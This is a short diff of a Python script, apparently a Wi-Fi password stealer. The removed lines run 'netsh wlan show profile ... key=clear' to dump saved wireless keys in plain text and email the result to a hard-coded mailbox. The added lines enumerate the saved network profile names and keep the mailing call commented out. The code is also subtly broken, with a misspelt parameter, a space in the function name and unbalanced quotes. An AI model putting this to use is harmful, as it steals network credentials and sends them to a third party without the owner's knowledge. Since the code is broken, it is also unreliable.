@@ -9,6 +9,10 @@ def send mail(emial,password,message):
     server.sendmail(email,email,message)
     server.quit()
 
-command = "netsh wlan show profile <networkname> key=clear"
-result=subprocess.check_output(command,shell=True)
-send_mail("<mailid>","<password>",result")
+command = "netsh wlan show profile"
+networks=subprocess.check_output(command,shell=True)
+network_names = re.findall("(?:Profile\s*:\s)(.*)",networks)
+print(network_names)
+
+
+#send_mail("<mailid>","<password>",result")
